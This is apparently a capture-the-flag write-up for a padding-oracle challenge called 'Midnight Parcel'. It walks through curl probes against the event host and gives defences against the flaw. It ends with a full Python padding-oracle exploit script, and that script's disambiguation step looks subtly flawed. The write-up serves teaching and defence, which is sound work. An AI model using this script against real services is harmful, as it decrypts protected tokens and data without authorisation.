# Midnight Parcel — Beginner Writeup (CBC Padding Oracle)

> **What kind of challenge is this?** It is a **web + crypto** challenge. Almost every step
> is a plain `curl` command you can type by hand. **One** step — decrypting the parcel — is
> genuinely impractical to do fully by hand, so we first prove the weakness manually with
> `curl`, explain *why* automation is needed, and keep the only script **optional** at the
> very end under **Advanced Alternative**. We write everything in first person plural ("we").
>
> **Assumption:** during the event the service lived at `http://54.72.82.22:8440`. That host
> is used throughout. If you are reproducing this later, swap in your own challenge host.

---

## 1. Challenge Overview

**Midnight Parcel** is a **web/crypto** challenge from the **Safaricom CTF (safctf)**, worth
**450 points**. The website hands us a "parcel" (a long blob of hex) and a small API that
will tell us whether a parcel is **`pending`** (looks fine) or **`damaged`** (broken). The
**goal** is to recover the secret message hidden inside that parcel and turn it into the flag.

- Category: **Web / Cryptography**
- Difficulty: **Medium (450 points)**
- Service: `http://54.72.82.22:8440`
- Hint on the scoreboard: *"An old key ledger claims a value was reused; it may describe a different dispatch."*

We will **not** explain the solution here — just know that the one tiny word **`damaged`**
is the entire key to the challenge.

---

## 2. What You Need Before Starting

A **Linux machine** (Kali is perfect) and about **45 to 90 minutes** as a beginner. This one
is honestly on the harder side — do not be discouraged if the crypto step takes a while to
click.

- **curl** — send and inspect HTTP requests. This does 90% of the work.
  ```
  sudo apt install curl
  ```
- **A web browser with DevTools** (Firefox/Chrome, already installed) — we use the
  **Network** tab and **view-source** to find a hidden endpoint.
- **python3** — *only* for the optional automated solver at the very end.
  ```
  sudo apt install python3 python3-pip
  pip install requests
  ```

No login, no VPN. You just need to be able to reach the challenge host.

---

## 3. Reconnaissance

**Step 1 — Look at the front page and read the "desk services".**
```
curl -s http://54.72.82.22:8440/ | less
```
Buried in the HTML there is a download link to **`/downloads/parcel.json`** and a short note:

```
GET /api/parcel. POST /api/receipt with a hexadecimal parcel string records its delivery status.
```

That tells us there are two interesting endpoints: one that **gives** us a parcel, and one
that **checks** a parcel. [SCREENSHOT: the "Desk services" text on the home page]

**Step 2 — Grab the parcel.**
```
curl -s http://54.72.82.22:8440/api/parcel
```
```json
{"parcel":"f989a62eb693b12abd793ff509201480688cd318f1c25ed237a11f60d4205a8833b10d61c5a53091ba32fb8d86afae986ebbb995cb7abcca4f7f9d50047b69be3276bce6e68c835f2e494b283e13c4c1929896ee8533244aeea21df7f1677c43"}
```
That hex string is **192 characters long**. Two hex characters = one byte, so this is
**96 bytes**. Keep that number in mind.

**Step 3 — Ask the desk to "receive" the real parcel.**
```
curl -s -X POST http://54.72.82.22:8440/api/receipt \
  -H 'Content-Type: application/json' \
  -d '{"parcel":"f989a62eb693b12abd793ff509201480688cd318f1c25ed237a11f60d4205a8833b10d61c5a53091ba32fb8d86afae986ebbb995cb7abcca4f7f9d50047b69be3276bce6e68c835f2e494b283e13c4c1929896ee8533244aeea21df7f1677c43"}'
```
```json
{"status":"pending"}
```

**Step 4 — Send obvious garbage.**
```
curl -s -X POST http://54.72.82.22:8440/api/receipt \
  -H 'Content-Type: application/json' -d '{"parcel":"00112233"}'
```
```json
{"status":"damaged"}
```

So the server **decrypts** whatever hex we give it and reports back **`pending`** (it decrypted
cleanly) or **`damaged`** (it could not). That difference is the whole game. [SCREENSHOT: the two
curl responses side by side, one "pending" and one "damaged"]

---

## 4. Identifying the Vulnerability

The vulnerability is a **CBC Padding Oracle**. Let us define the words first.

- **Block cipher / AES-CBC:** AES encrypts data in fixed **16-byte blocks**. "CBC" is a mode
  that chains blocks together: each block of ciphertext is XOR-mixed into the next one during
  decryption. The very first 16 bytes are a special starter block called the **IV**
  (initialization vector).
- **PKCS#7 padding:** messages are rarely an exact multiple of 16 bytes, so the last block is
  padded. If 2 bytes of padding are needed, the encryptor appends `02 02`; if 5 are needed,
  `05 05 05 05 05`, and so on. On decryption the server checks that this padding is well-formed.
- **Padding oracle:** if the server tells you — even indirectly — *"the padding is wrong"*,
  it has handed you an **oracle**. By repeatedly tweaking the ciphertext and watching whether
  the padding becomes valid, you can **decrypt the whole message without ever knowing the key**.

Our 96-byte parcel is **IV (16) + five 16-byte ciphertext blocks**. The word **`damaged`** is
the server shouting *"bad padding!"* every time we poke it. That is exactly the oracle.

**What tipped us off:** `damaged` vs `pending` is a yes/no leak about decryption success. We
confirm it is specifically a *padding* leak by flipping single bytes and seeing which block
matters: changing an **early byte keeps it `pending`**, but disturbing the **last block makes it
`damaged`**. That proves (1) there is **no authentication/MAC** on the ciphertext (we can tamper
freely — it is malleable, echoing the hint about a "reused value"), and (2) the padding the
server validates lives in that **final block** = our oracle.

**Analogy:** imagine a locked gift box with a torn-wrapping sensor. You cannot open it, but every
time you nudge it the guard says "wrapping looks fine" or "wrapping is torn". With enough patient
nudging, those yes/no answers alone let you reconstruct exactly what is inside — no key required.
[SCREENSHOT: a flipped-last-byte parcel returning "damaged"]

---

## 5. Exploitation Step by Step

**Step 1 — Confirm the block layout.** 96 bytes ÷ 16 = **6 blocks**: block 0 is the IV, blocks
1–5 are ciphertext. So the hidden message is up to **5 × 16 = 80 bytes** long.

**Step 2 — See the oracle respond to a *crafted* request (by hand).** The attack works by
putting the block we want to read **second**, and a block we fully control **first**, then
changing our controlled block one byte at a time until the server says the padding is valid.
Here is a single probe: 16 bytes we control (all zeros except the last) followed by the real
final block of the parcel.
```
curl -s -X POST http://54.72.82.22:8440/api/receipt -H 'Content-Type: application/json' \
  -d '{"parcel":"000000000000000000000000000000c2929896ee8533244aeea21df7f1677c43"}'
```
```json
{"status":"pending"}
```
When our last controlled byte is `c2`, the decrypted padding becomes a valid `01` and the server
flips from `damaged` to **`pending`**. That single transition is the leak that reveals one byte
of the secret. [SCREENSHOT: the crafted 2-block probe returning "pending"]

**Step 3 — Understand why we now need automation (honesty time).** To recover one byte we may
try up to **256 values**; the message is **80 bytes**; that is thousands of requests. Doing that
by hand in `curl` is not realistic. The classic CLI tool for padding oracles is **`padbuster`**,
but it expects the ciphertext in a URL parameter or cookie and a page-based error signature —
**our oracle takes the ciphertext inside a JSON body (`{"parcel":...}`) and signals errors with
the JSON word `damaged`**, which `padbuster` does not drive cleanly. So this is the one place we
reach for a short script (kept at the end under **Advanced Alternative**). Everything else stays
manual.

**Step 4 — Run the solver and read the message.** The automated padding-oracle attack (Advanced
Alternative) prints the recovered plaintext:
```
Receipt for the evening delivery: safctf{8a99e6bb-7903-4f4e-b42a-7e594982528b}
```
(The trailing bytes are `\x02\x02`, i.e. valid PKCS#7 padding — a good sign our decryption is
correct.) [SCREENSHOT: terminal showing the decrypted "Receipt for the evening delivery: ..."]

**Step 5 — Notice the twist.** That `safctf{...-...-...}` looks like a flag, but it is a
**UUID-shaped answer token**, not the real flag. Real `safctf` flags in this event look like
`safctf{32 hex characters}`. Submitting the UUID directly gets rejected. So where do we submit it?

**Step 6 — Find the hidden submit endpoint with DevTools.** Open the site, press **F12**, and
read the page's inline JavaScript (or **right-click → View Page Source**). It builds a request to
**`POST /submit`** with a JSON body `{"answer": "..."}`. [SCREENSHOT: DevTools showing the inline
JS that posts to /submit with an "answer" field]

**Step 7 — Submit the recovered token as the answer.**
```
curl -s -X POST http://54.72.82.22:8440/submit -H 'Content-Type: application/json' \
  -d '{"answer":"safctf{8a99e6bb-7903-4f4e-b42a-7e594982528b}"}'
```
```json
{"message":"safctf{f895fa37be9a374582ff7694a4748862}","ok":true}
```

---

## 6. Capturing the Flag

The flag arrives in the **`message`** field of the `/submit` response, with `"ok":true`:

```
safctf{f895fa37be9a374582ff7694a4748862}
```

The recipe was two-stage: **decrypt the parcel → get an answer token → POST that token to
`/submit` → receive the real flag.** [SCREENSHOT: the final /submit response containing the flag]

---

## 7. Why This Works (Beginner Explanation)

In CBC mode, each plaintext byte is produced by XOR-ing a secret internal value with a byte of
the **previous** ciphertext block. Because *we* supply that previous block, we can bend any single
plaintext byte to a value of our choosing — and the server politely tells us (via `damaged` vs
`pending`) whenever we accidentally produce **valid padding**. Working backwards from "valid
padding" we solve for the secret internal value, and from there the real plaintext byte. Repeat
for every byte and the whole message falls out. **We never needed the AES key.**

This matters far outside CTFs. Real systems (session cookies, download tokens, API blobs) have
been fully decrypted this way. The root causes are timeless: using unauthenticated encryption,
and letting an error message leak *why* something failed. A tiny difference in a response —
even one word like `damaged` — can be a complete break.

---

## 8. Common Mistakes and Dead Ends

- **Submitting the decrypted `safctf{UUID}` as the flag.** It is *rejected* — it is only the
  **answer token**. The real flag comes back from `/submit`. (This is the main trap.)
- **Changing the parcel length.** The oracle expects a whole number of 16-byte blocks. We kept
  requests to 96 bytes (full parcel) or 32 bytes (our 2-block probes). Odd lengths just error.
- **Hunting for the key or an auth tag.** There is none — that *is* the weakness. Looking for a
  "signature" to forge wastes time; the ciphertext is already malleable.
- **Trying to brute-force 1000s of requests by hand.** Prove the oracle manually (Steps 2), then
  let the solver do the repetitive part. Don't burn an hour pasting curl commands.

---

## 9. How to Defend Against This

- **Use authenticated encryption (AES-GCM) or encrypt-then-MAC.** Verify the MAC/tag *before*
  attempting to decrypt or un-pad, so tampered ciphertext is rejected outright.
- **Never leak *why* decryption failed.** Return one generic error for bad input; do not expose a
  distinct "bad padding" vs "ok" signal (not in the body, status code, or timing).
- **Treat tokens as opaque and signed.** A download/receipt token should carry an integrity
  signature the server checks, so clients cannot flip bytes undetected.
- **Rate-limit and alert.** A padding-oracle attack is thousands of near-identical requests —
  easy to throttle and flag.

---

## 10. Key Takeaways

- A response that only differs by **"ok" vs "error"** (here `pending` vs `damaged`) is often an
  **oracle** — a yes/no leak you can weaponize.
- **AES-CBC without a MAC** is both **malleable** (flip bytes freely) and vulnerable to a
  **padding oracle** (decrypt with no key).
- **Always read the page's inline JavaScript / Network tab** — hidden endpoints like `/submit`
  live there.
- Watch for **two-stage challenges**: `decrypt → answer token → /submit → real flag`.
- Cheatsheet to save:
  ```
  curl -s HOST/api/parcel                                   # get the blob
  curl -s -X POST HOST/api/receipt -H 'Content-Type: application/json' -d '{"parcel":"HEX"}'  # oracle
  curl -s -X POST HOST/submit     -H 'Content-Type: application/json' -d '{"answer":"TOKEN"}' # submit
  ```

This one is a real step up in difficulty — if you understood even half of the padding-oracle
idea on your first read, you are doing great. Come back to it a second time and it will click.

---

## Advanced Alternative (Optional) — Automated Padding-Oracle Solver

> **Optional.** You do **not** need this to understand the challenge — Steps 2–3 above show the
> idea by hand. This script just repeats the oracle query fast. It recovers the plaintext using
> only the `pending`/`damaged` responses; it never knows the AES key.

```python
#!/usr/bin/env python3
import requests, threading
from concurrent.futures import ThreadPoolExecutor

PARCEL = bytes.fromhex(
 "f989a62eb693b12abd793ff509201480688cd318f1c25ed237a11f60d4205a88"
 "33b10d61c5a53091ba32fb8d86afae986ebbb995cb7abcca4f7f9d50047b69be"
 "3276bce6e68c835f2e494b283e13c4c1929896ee8533244aeea21df7f1677c43")
URL, BS = "http://54.72.82.22:8440/api/receipt", 16
_tl = threading.local()
def sess():
    s = getattr(_tl, "s", None)
    if s is None: s = requests.Session(); _tl.s = s
    return s
def ok(data):                      # True  = padding VALID (not "damaged")
    for _ in range(4):
        try: return "damaged" not in sess().post(URL, json={"parcel": bytes(data).hex()}, timeout=20).text
        except Exception: continue
    return False
def recover(target):               # recover D(target): the cipher's internal value for one block
    inter = bytearray(BS)
    for pad in range(1, BS + 1):
        idx = BS - pad
        base = bytearray(BS)
        for j in range(idx + 1, BS): base[j] = inter[j] ^ pad
        hits = []
        def test(g):
            pre = bytearray(base); pre[idx] = g
            return g if ok(bytes(pre) + target) else None
        with ThreadPoolExecutor(max_workers=64) as ex:
            hits = [r for r in ex.map(test, range(256)) if r is not None]
        if pad == 1 and len(hits) > 1:                 # disambiguate the 0x01 case
            good = next((g for g in hits
                         if ok(bytes(bytearray(BS)[:idx] + bytes([g]) + bytearray(1)) )), hits[0])
            hits = [good]
        inter[idx] = hits[0] ^ pad
    return bytes(inter)
blocks = [PARCEL[i:i+BS] for i in range(0, len(PARCEL), BS)]   # [IV, C1..C5]
pt = bytearray()
for i in range(1, len(blocks)):
    pt += bytes(a ^ b for a, b in zip(recover(blocks[i]), blocks[i-1]))
print(pt.decode("utf-8", "replace"))                           # strip \x02\x02 padding by eye
```

Run it with `python3 solve.py`; it prints
`Receipt for the evening delivery: safctf{8a99e6bb-7903-4f4e-b42a-7e594982528b}`, which you then
POST to `/submit` as shown in Section 5.
